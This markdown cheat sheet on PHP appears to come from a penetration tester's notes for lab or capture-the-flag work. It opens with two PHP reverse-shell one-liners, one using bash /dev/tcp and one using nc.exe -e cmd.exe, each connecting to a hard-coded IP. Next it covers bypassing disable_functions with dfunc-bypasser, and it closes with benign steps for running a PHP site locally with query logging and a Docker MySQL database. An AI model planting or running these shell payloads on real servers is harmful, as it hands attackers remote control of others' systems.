# PHP

All things PHP

```php
# Reverse shell payload
<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.221/81 0>&1'\");?>
<?php exec(\"C:\ProgramData\System\nc.exe 172.16.87.254 443 -e cmd.exe\");?>
```

## Capabilities

### dfunc-bypasser

If access to phpinfo, but command execution not working, check `disable_functions`, and run the file/url against [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser)

```bash
# Check a phpinfo.php file
python2 dfunc-bypasser/dfunc-bypasser.py --file phpinfo.ph

# Check a phpinfo url
python2 dfunc-bypasser/dfunc-bypasser.py --url http://localhost/phpinfo.php
```

### Web Server

Emulate a web server given the source code via the following steps

Change database calls within the source code by adding the following function to `db_utils.php`:

```php
function print_sql_query($stmt, $params = []) {
	$query = $stmt->queryString;
	foreach ($params as $key => $value) {
		$query = str_replace(":$key", "'" . $value . "'", $query);
	}
	file_put_contents('debug.log', $query . "\n", FILE_APPEND);
}
```

Then comment out the database calls and add the print function below it:

```php
$stmt->execute($params);
```

Becomes

```php
// $stmt -> execute($params);
print_sql_query($stmt, $params);
```

This will allow the website to function without a database, and printing all database calls to a newly created file `debug.log`.

Continuously view `debug.log` with the command:

```bash
tail -f debug.log
```

Note: You can add the code:

```php
file_put_contents('debug.log', $any_variable . "\n", FILE_APPEND);
```

To any part of the code now to output additional debug information

### Database

To still simulate the database connection perform the following steps:

Install Docker

```bash
sudo apt-get install docker.io
```

Start Docker

```bash
sudo systemctl start docker
sudo systemctl enable docker
```

Verify installation

```bash
sudo docker --version
```

Run MySQL in Docker

```bash
sudo docker pull mysql
```

Start MySQL container

```bash
sudo docker run --name mysql-db -e MYSQL_ROOT_PASSWORD=myrootpassword -e MYSQL_DATABASE=clicker -e MYSQL_USER=clicker_db_user -e MYSQL_PASSWORD=clicker_db_password -p 3306:3306 -d mysql
```

Where `MYSQL_DATABASE`, `MYSQL_USER`, and `MYSQL_PASSWORD` are changed to their proper values based on the `db_utils.php` file.

Check container status

```bash
sudo docker ps
```

Once done analyzing, tear down with the commands:

```bash
sudo docker stop mysql-db
sudo docker rm mysql-db
```

### Execution

Now you can run the website with the following command:

```bash
php -S localhost:8000
```
